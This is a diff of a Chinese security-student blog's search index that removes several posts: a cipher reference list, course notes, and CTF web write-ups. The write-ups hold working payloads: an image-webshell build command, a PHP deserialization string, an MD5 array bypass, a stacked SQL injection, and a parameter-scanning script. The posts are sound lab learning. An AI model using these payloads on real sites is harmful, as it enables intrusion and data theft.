-<h5 id="3-猪圈变形2"><a href="#3-猪圈变形2" class="headerlink" title="3.猪圈变形2"></a>3.猪圈变形2</h5><p><img src="https://img-blog.csdnimg.cn/20201213171716955.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="4-猪圈变形4"><a href="#4-猪圈变形4" class="headerlink" title="4.猪圈变形4"></a>4.猪圈变形4</h5><p><img src="https://img-blog.csdnimg.cn/20201213171957838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="5-宇宙的信号"><a href="#5-宇宙的信号" class="headerlink" title="5.宇宙的信号"></a>5.宇宙的信号</h5><p><img src="https://img-blog.csdnimg.cn/20201213172025785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="6-福尔摩斯跳舞的小人"><a href="#6-福尔摩斯跳舞的小人" class="headerlink" title="6.福尔摩斯跳舞的小人"></a>6.福尔摩斯跳舞的小人</h5><p>有拿旗子和不拿旗子两种</p>
-<p><img src="https://img-blog.csdnimg.cn/20201213172051787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="7-a-z是顺序来的"><a href="#7-a-z是顺序来的" class="headerlink" title="7.a-z是顺序来的"></a>7.a-z是顺序来的</h5><p><img src="https://img-blog.csdnimg.cn/20201213172133298.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="8-古埃及象形文字"><a href="#8-古埃及象形文字" class="headerlink" title="8.古埃及象形文字"></a>8.古埃及象形文字</h5><p><img src="https://img-blog.csdnimg.cn/20201213172239642.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="9-古精灵语"><a href="#9-古精灵语" class="headerlink" title="9.古精灵语"></a>9.古精灵语</h5><p>字母<br>数字</p>
-<p><img src="https://img-blog.csdnimg.cn/20201213172259135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="10-神奇宝贝鸟图腾"><a href="#10-神奇宝贝鸟图腾" class="headerlink" title="10.神奇宝贝鸟图腾"></a>10.神奇宝贝鸟图腾</h5><p><img src="https://img-blog.csdnimg.cn/20201213172434844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="11-阿雷西博射电望远镜用二进制表示1-10数字"><a href="#11-阿雷西博射电望远镜用二进制表示1-10数字" class="headerlink" title="11.阿雷西博射电望远镜用二进制表示1-10数字"></a>11.阿雷西博射电望远镜用二进制表示1-10数字</h5><p><img src="https://img-blog.csdnimg.cn/20201213172805434.png#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="12-盲文"><a href="#12-盲文" class="headerlink" title="12.盲文"></a>12.盲文</h5><p>这里只有英文字母和数字，当然声母韵母声调等还是 不一样的。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201213172831531.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/2020121317322193.png#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="13-音符加密"><a href="#13-音符加密" class="headerlink" title="13.音符加密"></a>13.音符加密</h5><p><img src="https://img-blog.csdnimg.cn/20201213173240570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201213173240509.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201213173240489.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h5 id="14-天干地支"><a href="#14-天干地支" class="headerlink" title="14.天干地支"></a>14.天干地支</h5><p><img src="https://img-blog.csdnimg.cn/20201213173309635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="15-搜狗软键盘"><a href="#15-搜狗软键盘" class="headerlink" title="15.搜狗软键盘"></a>15.搜狗软键盘</h5><p><img src="https://img-blog.csdnimg.cn/20210112163836195.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>原文链接：<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p>
-<h5 id="星座密码"><a href="#星座密码" class="headerlink" title="星座密码"></a>星座密码</h5><p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210531213925718.png" alt="image-20210531213925718"></p>
-]]></content>
-      <tags>
-        <tag>cryptography</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图片马</title>
-    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
-    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
-<p>  如 1.jpg与 2.php同在桌面，则：</p>
-<p>  cd   desktop</p>
-<ol start="2">
-<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
-<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
-<p>​    </p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>upload-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>other 一些 information</title>
-    <url>/2020/11/05/x/%E8%AF%BE%E7%A8%8B/</url>
-    <content><![CDATA[<h4 id="fafu学长讲课记录的："><a href="#fafu学长讲课记录的：" class="headerlink" title="fafu学长讲课记录的："></a>fafu学长讲课记录的：</h4><p>Web安全</p>
-<p>crypto：矩阵，数论，密码学</p>
-<p>dvwa平台</p>
-<h5 id="html的常见标签"><a href="#html的常见标签" class="headerlink" title="html的常见标签"></a>html的常见标签</h5><ul>
-<li><ul>
-<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
-<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
-<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
-<li><strong><title></title></strong> 元素描述了文档的标题</li>
-<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
-<li><strong><h1></h1></strong> 元素定义一个大标题</li>
-<li><strong><p></p></strong> 元素定义一个段落</li>
-<li>HTML      标签通常是<em>成对出现</em>的，比如 <b> 和      </b></li>
-<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
-</ul>
-</li>
-</ul>
-<h5 id="HTML-网页结构"><a href="#HTML-网页结构" class="headerlink" title="HTML 网页结构"></a><strong>HTML 网页结构</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是一个可视化的HTML页面结构：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;这是一个标题&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="大佬讲课"><a href="#大佬讲课" class="headerlink" title="大佬讲课"></a>大佬讲课</h4><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(170).png"></p>
-<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(171).png"></p>
-<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(172).png"></p>
-<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(173).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(177).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(179).png"></p>
-<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(180).png"></p>
-<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(181).png"></p>
-]]></content>
-      <tags>
-        <tag>分享会</tag>
       </tags>
   </entry>
   <entry>
@@ -1696,131 +1957,6 @@
 ]]></content>
       <tags>
         <tag>upload-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯 2019高明的黑客</title>
-    <url>/2021/07/26/buu/1/</url>
-    <content><![CDATA[<p><img src="/2021/07/26/buu/1/image-20210726102939511.png" alt="image-20210726102939511"></p>
-<p>打开靶机后，网页提示下载源码：<a href="http://www.tar.gz/">www.tar.gz</a> </p>
-<p>猜测里面包含可以利用的漏洞文件。</p>
-<p>然后开始了漫长的下载。。。</p>
-<p>下载完成后，我们发现里面包含的文件挺多的，而且是很多都为木马文件，所以排除了用360侦测出目标文件。</p>
-<p>查看某些文件发现可以利用GET和POST传参利用。</p>
-<p>找到大佬写的脚本，用python来跑就不用一个个试了。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1&#x3D;threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;soft&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;src&#x2F;&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files &#x3D; os.listdir(filePath)</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">session.keep_alive &#x3D; False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;														#所有的$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;src&#x2F;&#39;+file</span><br><span class="line">    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag &#x3D;&#x3D; 1:													#flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param &#x3D; a</span><br><span class="line">        else:</span><br><span class="line">            param &#x3D; b</span><br><span class="line">        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/26/buu/1/image-20210726114732836.png" alt="image-20210726114732836"></p>
-<p>真的太膜拜了，单线程的脚本我都不会写。。。</p>
-<p>如图找到了可利用参数和文件</p>
-<p>接下来就是进行访问对应文件来进行利用</p>
-<p>结果如图</p>
-<p><img src="/2021/07/26/buu/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(301).png" alt="屏幕截图(301)"></p>
-]]></content>
-      <tags>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网鼎杯 2020 青龙组AreUSerialz</title>
-    <url>/2021/07/26/buu/2/</url>
-    <content><![CDATA[<p>​    打开后，出现代码页面</p>
-<p><img src="/2021/07/26/buu/2/image-20210726194801767.png" alt="image-20210726194801767"></p>
-<p>​    处理到vs上</p>
-<p><img src="/2021/07/26/buu/2/image-20210726194850909.png" alt="image-20210726194850909"></p>
-<p>接着我们逐段分析：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>​    包含了名为flag.php的文件。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected $op;</span><br><span class="line"></span><br><span class="line">protected $filename;</span><br><span class="line"></span><br><span class="line">protected $content;</span><br></pre></td></tr></table></figure>
-
-<p>​    受保护方法的三个变量</p>
-<p>接下来是借鉴了大佬博客</p>
-<p>经过分析，这个题目需要传入一个序列化之后的类对象（因为最后的valid函数会进行一步反序列化），并且要绕过两层防护：</p>
-<p>两个防护：<br><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line"></span><br><span class="line">  for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">​    if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line"></span><br><span class="line">​      return false;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里用到了python的ord函数：</p>
-<p>[^]: ord () 函数是 chr () 函数（对于8位的ASCII字符串）或 unichr () 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p>
-<p>绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
-<p><strong>destruct()魔术方法</strong><br>op===”2”，是强比较，</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p> <strong>而在process()函数中,</strong></p>
-<p>op==”2”是弱比较</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-<p> 绕过方法：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p>
-<p><img src="/2021/07/26/buu/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>绕过之后，就是到了关键一步，要进行本地序列化操作：</p>
-<p>我直接照搬了大佬的文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public  $op &#x3D; 2;</span><br><span class="line">    public  $filename &#x3D; &quot;flag.php&quot;;</span><br><span class="line">    public  $content &#x3D; &quot;1&quot;;        &#x2F;&#x2F;因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileHandler();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>访问xu.php</p>
-<p><img src="/2021/07/26/buu/2/image-20210726200434420.png" alt="image-20210726200434420"></p>
-<p>​        构建payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        F12得到flag：</p>
-<p><img src="/2021/07/26/buu/2/image-20210726200827967.png" alt="image-20210726200827967"></p>
-<p>本文借鉴于：[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">网鼎杯 2020 青龙组]AreUSerialz_RABCDXB的博客-CSDN博客</a></p>
-]]></content>
-      <tags>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MRCTF2020 Ez_bypass&amp;GYCTF2020 Blacklist</title>
-    <url>/2021/07/27/buu/3/</url>
-    <content><![CDATA[<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>打开靶机：</p>
-<p><img src="/2021/07/27/buu/3/image-20210727172208110.png" alt="image-20210727172208110"></p>
-<p>按照提示</p>
-<p>进入f12中</p>
-<p><img src="/2021/07/27/buu/3/image-20210727172249158.png" alt="image-20210727172249158"></p>
-<p>代码审计一下：</p>
-<p>里面包含了名为flag.php的文件，flag的格式也进行了说明</p>
-<p>接下来要处理两个变量，gg和id</p>
-<p>第一个if判断的是两个变量md5值相同但是其本身却不能相等</p>
-<p>我查找到了有关资料</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5不能处理数组，处理任意数组返回值都相同</span><br></pre></td></tr></table></figure>
-
-<p>所以我们直接这样赋值</p>
-<p>?id[]=1&amp;gg[]=2</p>
-<p>成功达成第一个条件：</p>
-<p><img src="/2021/07/27/buu/3/image-20210727172710626.png" alt="image-20210727172710626"></p>
-<p>接着看看第二个if需要完成什么</p>
-<p>提示我们POST传参passwd变量</p>
-<p>其值不能为数字型</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;是恒等计算符  同时检查表达式的值与类型</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;是比较运算符号  不会检查条件式的表达式的类型</span><br></pre></td></tr></table></figure>
-
-<p>之后的比较同样满足条件。思路有了，</p>
-<p>不过我做法错了，跟以前弱口令什么的混起来了，疯狂尝试了‘123456a’无果</p>
-<p>看了wp后才知道，其实不用加分号，直接passwd=1234567a，这里已经是字符型了。</p>
-<p>一剑封喉：</p>
-<p><img src="/2021/07/27/buu/3/image-20210727173223649.png" alt="image-20210727173223649"></p>
-<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>打开靶机后，明显注入题。</p>
-<p><img src="/2021/07/27/buu/3/image-20210727204621570.png" alt="image-20210727204621570"></p>
-<p>wp来源：<a href="https://www.cnblogs.com/20175211lyz/p/12356678.html">https://www.cnblogs.com/20175211lyz/p/12356678.html</a></p>
-<h4 id="姿势-堆叠注入"><a href="#姿势-堆叠注入" class="headerlink" title="姿势-堆叠注入"></a>姿势-堆叠注入</h4><p>获取库名、表名、列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from &#96;table_name&#96;;</span><br></pre></td></tr></table></figure>
-
-<p>试着查询了一下数据库名、表名和段名（<strong>这里没有用之前传统的联合查询，因为自己尝试查询之后发现后面会被正则表达式过滤</strong>）：</p>
-<p>ps：不过我不太清楚为什么这里查询要 ‘ 加上 ；</p>
-<p><img src="/2021/07/27/buu/3/image-20210727204959368.png" alt="image-20210727204959368"></p>
-<p><img src="/2021/07/27/buu/3/image-20210727205248791.png" alt="image-20210727205248791"></p>
-<p>出现了flag字样，然后用大佬的方法，</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>
-
-<p>官方解释是：</p>
-<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，</p>
-<p>该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
-<h4 id="Tip："><a href="#Tip：" class="headerlink" title="Tip："></a>Tip：</h4><p>本来应该还有一种姿势是修改表名，但是修改表名的关键字rename和alert都被正则ban掉，所以不能用</p>
-<p>这题若是改造之前的强网杯2019随便注一题则可以用此方法。</p>
-]]></content>
-      <tags>
-        <tag>buu</tag>
       </tags>
   </entry>
 </search>
